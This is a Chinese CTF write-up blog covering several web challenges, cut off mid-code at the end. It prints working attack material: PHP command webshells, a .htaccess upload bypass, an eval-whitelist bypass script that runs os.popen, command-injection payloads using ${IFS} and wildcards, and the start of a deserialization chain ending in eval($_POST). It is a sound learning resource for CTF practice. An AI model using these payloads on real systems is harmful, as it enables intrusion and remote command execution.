<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?<span class="type">php</span> <span class="variable">$a</span> <span class="operator">=</span> <span class="string">&#x27;sys&#x27;</span>;$b = <span class="string">&#x27;tem&#x27;</span>;$x = $a.$b;<span class="keyword">if</span> (!isset($_POST[<span class="string">&#x27;SH&#x27;</span>])) &#123;$z = <span class="string">&quot;&#x27;&#x27;&quot;</span>;&#125; <span class="keyword">else</span> $z = $_POST[<span class="string">&#x27;SH&#x27;</span>];?&gt;</span><br></pre></td></tr></table></figure>
<p>但是需要注意的一点,如果直接进行访问需要登入，所以我们就需要去尝试弱密码爆破或者sql注入</p>
<p><img src="https://luokuang1.github.io/images/shctf5.png" width="95%" height="60%"></p>
<p>最后拿到账号为admin qwer1234为密码</p>
<p>直接登入，带着cookie访问profile.php  post提交命令即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SH=cat <span class="comment">/*</span></span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/shctf6.png" width="95%" height="60%"></p>
<h3 id="Week4-0进制计算器"><a href="#Week4-0进制计算器" class="headerlink" title="[Week4] 0进制计算器"></a>[Week4] 0进制计算器</h3><p>这个题主要是代码审计了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, render_template, request, <span class="type">jsonify</span></span><br><span class="line">  </span><br><span class="line"><span class="variable">app</span> <span class="operator">=</span> Flask(__name__)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/&#x27;</span>)  </span><br><span class="line">def <span class="title function_">home</span><span class="params">()</span>:  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/execute&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])  </span><br><span class="line">def <span class="title function_">execute_code</span><span class="params">()</span>:  </span><br><span class="line">    data = request.<span class="type">json</span>  </span><br><span class="line">    <span class="variable">code</span> <span class="operator">=</span> data.get(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">    output = executer(code)</span><br><span class="line">    <span class="keyword">return</span> output   </span><br><span class="line"></span><br><span class="line">from contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">from io <span class="keyword">import</span> StringIO</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StupidInterpreter</span>:  </span><br><span class="line">    def <span class="title function_">__init__</span><span class="params">(self)</span>:  </span><br><span class="line">        self.variables = &#123;&#125;</span><br><span class="line">        </span><br><span class="line">    def <span class="title function_">interpret</span><span class="params">(self, code)</span>:  </span><br><span class="line">        <span class="keyword">if</span> self.checker(code) == False:</span><br><span class="line">            print(<span class="string">&quot;有脏东西！&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        commands = code.split(<span class="string">&#x27;;&#x27;</span>)  </span><br><span class="line">        <span class="keyword">for</span> command in commands:  </span><br><span class="line">            command = command.strip()  </span><br><span class="line">            <span class="keyword">if</span> command:  </span><br><span class="line">                self.execute_command(command)  </span><br><span class="line">  </span><br><span class="line">    def <span class="title function_">execute_command</span><span class="params">(self, command)</span>:  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> in command:  </span><br><span class="line">            variable, expression = command.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)  </span><br><span class="line">            variable = variable.strip()  </span><br><span class="line">            result = self.evaluate_expression(expression.strip())  </span><br><span class="line">            self.variables[variable] = result  </span><br><span class="line">        #执行打印操作</span><br><span class="line">        elif command.startswith(<span class="string">&#x27;cdhor(&#x27;</span>) and command.endswith(<span class="string">&#x27;)&#x27;</span>):</span><br><span class="line">            expression = command[<span class="number">6</span>:-<span class="number">1</span>].strip()  </span><br><span class="line">            result = self.evaluate_expression(expression)  </span><br><span class="line">            print(result)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            print(f<span class="string">&quot;未知指令: &#123;command&#125;&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    def <span class="title function_">evaluate_expression</span><span class="params">(self, expression)</span>:  </span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">var</span>, value in self.variables.items():  </span><br><span class="line">            expression = expression.replace(<span class="keyword">var</span>, str(value))  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">return</span> eval(expression, &#123;&#125;, &#123;&#125;)</span><br><span class="line">        except Exception as e:  </span><br><span class="line">            print(f<span class="string">&quot;执行出错: &#123;e&#125;&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> None  </span><br><span class="line">                </span><br><span class="line">    def <span class="title function_">checker</span><span class="params">(self, string)</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            string.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        except UnicodeEncodeError:</span><br><span class="line">            <span class="keyword">return</span> <span class="type">False</span> </span><br><span class="line">        <span class="variable">allow_chr</span> <span class="operator">=</span> <span class="string">&#x27;0cdhor+-*/=()&quot;\&#x27;; &#x27;</span></span><br><span class="line">        <span class="keyword">for</span> <span class="type">char</span> in string:  </span><br><span class="line">            <span class="keyword">if</span> <span class="type">char</span> not in allow_chr:  </span><br><span class="line">                <span class="keyword">return</span> False    </span><br><span class="line"></span><br><span class="line">def <span class="title function_">executer</span><span class="params">(code)</span>:</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    interpreter = StupidInterpreter()  </span><br><span class="line">    with <span class="title function_">redirect_stdout</span><span class="params">(outputIO)</span>:</span><br><span class="line">        interpreter.interpret(code)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line">    <span class="keyword">return</span>(output)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(debug=False)</span><br></pre></td></tr></table></figure>
<p>首先通过白名单绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">allow_chr = <span class="string">&#x27;0cdhor+-*/=()&quot;\&#x27;; &#x27;</span></span><br></pre></td></tr></table></figure>
<p>这里最后会进行执行一个eval函数，而要做的就是将expression来进行拼接为一个能执行的字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> eval(expression, &#123;&#125;, &#123;&#125;)</span><br></pre></td></tr></table></figure>
<p>首先可以用python的两个函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">chr() <span class="comment">//通过ascii码转字符</span></span><br><span class="line">ord() <span class="comment">//将字符转ascii码</span></span><br></pre></td></tr></table></figure>
<p>这里就可以拼接出一个数字</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ord(<span class="string">&#x27;*&#x27;</span>)-ord(<span class="string">&#x27;)&#x27;</span>) <span class="comment">//这个是数字 1</span></span><br><span class="line"><span class="comment">//通过+就可以拼凑出一个字符的ascii</span></span><br></pre></td></tr></table></figure>
<p>比如通过python脚本来进行编写就可以得到一个字符得ascii码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"># print(a)</span><br><span class="line">qwe=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in a:</span><br><span class="line">    #print(ord(i))</span><br><span class="line">    d=ord(i)</span><br><span class="line">    s=<span class="string">&quot;ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">    f=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(f&lt;d):</span><br><span class="line">        s+=<span class="string">&quot;+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">        f+=<span class="number">1</span></span><br><span class="line">    #print(s)</span><br><span class="line">    qwe=<span class="string">&quot;chr(&quot;</span>+s+<span class="string">&quot;)&quot;</span></span><br><span class="line">print(qwe)</span><br><span class="line"><span class="comment">//chr(ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;))</span></span><br><span class="line">print(eval(qwe)) <span class="comment">//a</span></span><br></pre></td></tr></table></figure>
<p>这里就可以开始分析如何拼接字符串和构造poc链了，这里主要是两个符号来进行执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> in command:  </span><br><span class="line">    variable, expression = command.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)  </span><br><span class="line">    variable = variable.strip()  </span><br><span class="line">    result = self.evaluate_expression(expression.strip())  </span><br><span class="line">    self.variables[variable] = result  </span><br><span class="line">#执行打印操作</span><br><span class="line">elif command.startswith(<span class="string">&#x27;cdhor(&#x27;</span>) and command.endswith(<span class="string">&#x27;)&#x27;</span>):</span><br><span class="line">    expression = command[<span class="number">6</span>:-<span class="number">1</span>].strip()  </span><br><span class="line">    result = self.evaluate_expression(expression)  </span><br><span class="line">    print(result)  </span><br></pre></td></tr></table></figure>
<p>这里首先是可以通过;号来隔开每个不同的命令，而有两个命令执行形式不同，一个为=，另外一个为cdhor()</p>
<p>先去看看 = 号发生了什么，其实就是将等号右边的命令进行执行了，左边的作为新的键名，键值为执行结果，这里就可以大胆的想，这里就可以实现对字符串的拼接，如果将我们poc链需要的字典放到创建的集合中就可以开始拼接字符串</p>
<p>其实关键在执行命令时有一个替换的过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">var</span>, value in self.variables.items():  </span><br><span class="line">    expression = expression.replace(<span class="keyword">var</span>, str(value))</span><br></pre></td></tr></table></figure>
<p>这里如果将字典构建完成后，我们在通过cdhor()来执行拼接的结果就可以绕过，并且执行命令，下面的python脚本就可以开始执行,但是脚本还需要自动进行拼接，还有可能比较长，但是不影响，只是怎么简单怎么来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#首先实现字典的构造，这里构造的qwe前面会多一个;号，去掉即可</span></span><br><span class="line">a=<span class="string">&#x27;&gt;:+asdfghjklqwertyuiopzxcvbnm_[\&#x27;&quot;N]().&#123;&#125;, 0123456789/&#x27;</span></span><br><span class="line">qwe=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(ord(i))</span></span><br><span class="line">    d=<span class="built_in">ord</span>(i)</span><br><span class="line">    s=<span class="string">&quot;ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">    f=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(f&lt;d):</span><br><span class="line">        s+=<span class="string">&quot;+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">        f+=<span class="number">1</span></span><br><span class="line">    <span class="comment">#print(s)</span></span><br><span class="line">    ss=<span class="string">&quot;chr(&quot;</span>+s+<span class="string">&quot;)&quot;</span></span><br><span class="line">    dd=ss+<span class="string">&quot;=&quot;</span>+ss</span><br><span class="line">    <span class="comment">#print(ss)</span></span><br><span class="line">    qwe=qwe+<span class="string">&quot;;&quot;</span>+dd</span><br><span class="line"><span class="built_in">print</span>(qwe)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="comment">#下面构造执行命令的payload</span></span><br><span class="line">b=<span class="string">&quot;globals()[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /fl44gggg\&quot;).read()&#x27;)&quot;</span></span><br><span class="line">asd=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="comment">#print(ord(i))</span></span><br><span class="line">    d=<span class="built_in">ord</span>(i)</span><br><span class="line">    s=<span class="string">&quot;ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">    f=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(f&lt;d):</span><br><span class="line">        s+=<span class="string">&quot;+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">        f+=<span class="number">1</span></span><br><span class="line">    <span class="comment">#print(s)</span></span><br><span class="line">    ss=<span class="string">&quot;chr(&quot;</span>+s+<span class="string">&quot;)&quot;</span></span><br><span class="line">    dd=ss+<span class="string">&quot;=&quot;</span>+ss</span><br><span class="line">    <span class="comment">#print(ss)</span></span><br><span class="line">    asd=asd+ss</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cdhor(&quot;</span>+asd+<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这里需要注意如果直接执行命令就只会输出0或者1,但是我们可以通过ssti的方法通过.read()来让print输出结果</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BuildCTF2024</title>
    <url>/2024/11/02/BuildCTF2024/</url>
    <content><![CDATA[<h3 id="ez-http"><a href="#ez-http" class="headerlink" title="ez!http"></a>ez!http</h3><p>知识点 http头</p>
<p>最开始直接抓包通过repeater模块进行发包</p>
<p>通过修改提交的user值为root绕过第一层，或者直接修改js值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//只有从blog.buildctf.vip来的用户才可以访问</span></span><br><span class="line">通过Referer来进行伪造</span><br><span class="line">Referer: blog.buildctf.vip</span><br><span class="line"><span class="comment">//需要使用buildctf专用浏览器</span></span><br><span class="line">通过User-Agent来进行伪造</span><br><span class="line">User-Agent: buildctf</span><br><span class="line"><span class="comment">//只有来自内网的用户才能访问</span></span><br><span class="line">通过xff来伪造内网ip</span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="comment">//只接受2042.99.99这一天发送的请求</span></span><br><span class="line">通过Date来伪造时间</span><br><span class="line">Date: <span class="number">2042.99</span>.<span class="number">99</span></span><br><span class="line"><span class="comment">//只有发起请求的邮箱为root@buildctf.vip才能访问后台</span></span><br><span class="line">通过From来伪造邮箱</span><br><span class="line">From: root@buildctf.vip</span><br><span class="line"><span class="comment">//只接受代理为buildctf.via的请求</span></span><br><span class="line">通过Via来设置代理</span><br><span class="line">Via: buildctf.via</span><br><span class="line"><span class="comment">//浏览器只接受名为buildctf的语言</span></span><br><span class="line">通过Accept-Language来规定语言</span><br><span class="line">Accept-Language: buildctf</span><br></pre></td></tr></table></figure>
<p>最后直接添加post提交</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">This_is_flag</span><br></pre></td></tr></table></figure>
<p>最后的报文</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">27.25</span>.<span class="number">151.80</span>:<span class="number">37647</span></span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//27.25.151.80:37647</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: buildctf</span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: blog.buildctf.vip</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: buildctf</span></span><br><span class="line"><span class="comment">Date: 2042.99.99</span></span><br><span class="line"><span class="comment">From: root<span class="doctag">@buildctf</span>.vip</span></span><br><span class="line"><span class="comment">Via: buildctf.via</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">user=root&amp;getFlag=This_is_flag</span></span><br></pre></td></tr></table></figure>
<h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><p>知识点为：.htaccess配置文件+短标签绕过</p>
<p>首先先上传一个.jpg文件，这个.jpg文件内容为我们的一句话木马，发现它输出一句不认识图片，这里已经修改为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/jpeg 并且 后缀为.<span class="property">jpg</span>了，可能原因就是图片头的作用</span><br><span class="line">直接在文件开头添加 <span class="title class_">GIF89</span>a  即可</span><br></pre></td></tr></table></figure>
<p>可以尝试去绕过后缀,尝试修改为其它php形式的后缀，.php .phtml .php3,但是发现都步可以绕过，这里猜测源码里面有了白名单过滤，可能只能传jpg文件，这里也就可以猜测出可能要通过配置文件来进行解析我们上传的图片马</p>
<p>目前是这样的</p>
<p><img src="https://luokuang1.github.io/images/build1.png" width="95%" height="80%"></p>
<p>现在就可以去尝试添加马在图片里面，这里发现提交有php的都会被waf，所以js头和简单的马都不可以写，就可以通过短标签进行绕过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?= ?&gt;</span><br></pre></td></tr></table></figure>
<p>里面又继续进行了过滤，比如: system eval </p>
<p>所以我们可以通过反引号``来进行绕过,这里就完成了木马的上传</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?= <span class="string">`ls /`</span>;?&gt;</span><br></pre></td></tr></table></figure>
<p>上传配置文件，刚开始因为该目录下有upload.php以为可以直接上传.user.ini但是发现绕过不了，就可以尝试上传.htaccess文件，发现上传成功只需要修改</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/jpeg</span><br></pre></td></tr></table></figure>
<p>最后就是编写.htaccess文件内容，里面的qwe.jpg为上传的图片马的名字</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;qwe.jpg&quot;</span>&gt;</span><br><span class="line">  <span class="title class_">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="title class_">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>
<p>这里再去访问/uploads/qwe.jpg就发现命令执行了，但是找不到flag</p>
<p>尝试通过find命令来查找还是一样</p>
<p>最后发现在环境变量里面，通过export来即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?= <span class="string">`export`</span>;?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/build2.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/build3.png" width="95%" height="80%"></p>
<h3 id="find-the-id"><a href="#find-the-id" class="headerlink" title="find-the-id"></a>find-the-id</h3><p>爆破题</p>
<p><img src="https://luokuang1.github.io/images/build4.png" width="95%" height="80%"></p>
<p>这里要输入一个数字直接通过bp爆破模块即可</p>
<p><img src="https://luokuang1.github.io/images/build5.png" width="95%" height="80%"></p>
<p>这里就可以确定为207，查看源码的flag</p>
<h3 id="我写的网站被rce了？"><a href="#我写的网站被rce了？" class="headerlink" title="我写的网站被rce了？"></a>我写的网站被rce了？</h3><p>rce管道符</p>
<p><img src="https://luokuang1.github.io/images/build6.png" width="95%" height="80%"></p>
<p>这里有几个按钮，挨个点一次发现’查看日志’可以查看文件</p>
<p>抓报发现有一个参数，如果进行修改就发现一个提示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">log_type=access</span><br><span class="line">/<span class="keyword">var</span>/log/nginx/ls.log该文件路径错误或不合法，请查看路径是否正确 </span><br></pre></td></tr></table></figure>
<p>猜测这里是通过拼接命令进行执行命令，但是过滤;&amp;&amp;也不能有就可以尝试通过||来进行命令，因为后面的.log的进行拼接去除所以就可以通过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">||ls|| <span class="comment">//发现报错但是执行成功</span></span><br></pre></td></tr></table></figure>
<p>尝试知道这里过滤了空格和flag cat tac 用nl来读取${IFS}绕过空格,?来绕过flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">||nl$&#123;IFS&#125;/f???||</span><br></pre></td></tr></table></figure>
<h3 id="LovePopChain"><a href="#LovePopChain" class="headerlink" title="LovePopChain"></a>LovePopChain</h3><p>PHP反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$NoLove</span>=<span class="string">&quot;Do_You_Want_Fl4g?&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Forgzy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;NoLove == <span class="string">&quot;Do_You_Want_Fl4g?&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Love but not getting it!!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Forgzy = <span class="keyword">clone</span> <span class="keyword">new</span> <span class="title class_">GaoZhouYue</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GaoZhouYue</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Yuer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$LastOne</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;最后一次了, 爱而不得, 未必就是遗憾~~&#x27;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;y3y4&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hybcx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$JiuYue</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Si</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Si-&gt;JiuYue=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ai</span> = <span class="variable language_">$this</span>-&gt;Si;</span><br><span class="line">        <span 